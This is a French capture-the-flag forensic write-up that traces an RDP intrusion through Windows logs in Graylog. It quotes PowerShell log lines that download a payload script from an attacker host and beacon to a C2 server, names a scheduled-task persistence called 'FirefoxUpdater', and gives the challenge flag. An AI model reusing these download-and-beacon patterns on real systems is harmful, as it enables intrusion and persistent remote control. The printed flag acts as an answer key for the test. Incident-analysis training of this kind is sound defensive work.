# Grays Anatomy

__*Catégorie :*__ FORENSIC  
__*Difficulté :*__ Medium  
__*Flag :*__ `CYBN{192.168.52.1_C:\Users\Public\Music\784dcff34b5a4c06b3dd8c729cf2243c\7639839a5e4a4511b93bb9ed654c2919.ps1_FirefoxUpdater_172.20.101.12}`  

> Je me suis rendu compte aujourd'hui que les accès RDP étaient encore ouverts sur ma machine. Le mec du support l'a jamais coupé.  
>  
> Comment je le sais ? Mon équipe sécu à identifié des alertes sur mon ordi, donc j'imagine bien que c'était la porte ouverte aux petits malins :)  
>  
> On va vérifier ensemble si l'équipe sécu à bien trouver tout ce qu'il s'est passé. Heureusement qu'on exporte tous les logs hehe  
>  
> Identifie, dans le cadre de la compromission du poste de travail :  
> - L'IP source de la connexion interactive malveillante  
> - Le chemin complet du fichier malveillant déposé  
> - Le nom donné à la persistance  
> - L'IP du serveur malveillant  
>  
> Format : `CYBN{10.0.2.12_C:\ProgramData\fichier.txt_NomPersitance_192.168.45.123}`


---

Pour ce challenge, on a accès à une instance Graylog dans laquelle ont été importés des journaux Windows. On voit tout de suite qu'ils proviennent tous d'une seule machine : `DESKTOP-NLOA8B1`.

## Partie 1 : Source de la connexion

D'après la description, la compromission vient d'une connexion RDP restée ouverte. On cherche donc une ouverture de session à distance.

Vers 22:12, on voit que `rdpclip.exe` a été lancé sur la machine. C'est le processus qui gère le presse-papiers (copier-coller) pendant une session RDP, donc sa présence indique une session RDP active.

L'événement de création de ce processus contient l'ID d'ouverture de session (`Logon ID`, par exemple `0x1234`). En recherchant cette valeur, on remonte jusqu'à l'événement d'ouverture de session (4624, type 10 – RemoteInteractive). La connexion a été établie depuis l'adresse IP `192.168.52.1` :

```
Adresse du réseau source : 192.168.52.1
```

## Partie 2 : Chemin du fichier malveillant

Une fois connecté en RDP, l'attaquant a dû récupérer sa charge utile. Le moyen le plus simple est souvent de la télécharger par HTTP.

On cherche donc les appels à `Invoke-WebRequest` dans les journaux PowerShell (événement 4103, journalisation des modules). Il y en a deux pendant la session : le premier a échoué, le second a réussi :

```
CommandInvocation (Invoke-WebRequest) : « Invoke-WebRequest »
Liaison de paramètre (Invoke-WebRequest) : nom = « Uri » ; valeur = « http://192.168.52.143:8888/ »
Liaison de paramètre (Invoke-WebRequest) : nom = « OutFile » ; valeur = « C:\Users\Public\Music\784dcff34b5a4c06b3dd8c729cf2243c\7639839a5e4a4511b93bb9ed654c2919.ps1 »
```

Le paramètre `OutFile` donne le chemin du script déposé sur le disque.

## Partie 3 : Nom de la persistance

Pour trouver toutes les fois où ce script a été utilisé, il suffit de chercher son chemin :

```
"C:\Users\Public\Music\784dcff34b5a4c06b3dd8c729cf2243c\7639839a5e4a4511b93bb9ed654c2919.ps1"
```

On voit qu'une tâche planifiée a été créée pour le lancer automatiquement, à un intervalle que je ne peux plus vérifier aujourd'hui =(.

![Pasted image 20261123224024](./images/Pasted%20image%2020261123224024.png)


Son nom apparaît dans l'événement de création de la tâche (`EventID`: 4698) :

```
Nom de la tâche : \FirefoxUpdater
```

Le nom de la persistance est donc `FirefoxUpdater`.

## Partie 4 : IP du serveur malveillant

Pour savoir ce que fait cette tâche, on prend une de ses exécutions et on suit l'ID du processus PowerShell lancé, ce qui donne tout le déroulé.

Cette fois, le script utilise `Invoke-RestMethod` :

```
Liaison de paramètre (Invoke-RestMethod) : nom = « Uri » ; valeur = « http://172.20.101.12:8888/heartbeat »
```

Le point de terminaison `/heartbeat` montre que la machine se signale régulièrement à un serveur de commande et de contrôle (C2). L'adresse du C2 contactée à chaque exécution de la tâche est donc `172.20.101.12`.

## Partie 5 : Flag

On peut alors reconstituer le flag :

```
CYBN{192.168.52.1_C:\Users\Public\Music\784dcff34b5a4c06b3dd8c729cf2243c\7639839a5e4a4511b93bb9ed654c2919.ps1_FirefoxUpdater_172.20.101.12}
```

## Partie 6 : First blood

J'en ai les mains qui tremblent

![Pasted image 20261123224520](./images/Pasted%20image%2020261123224520.png)

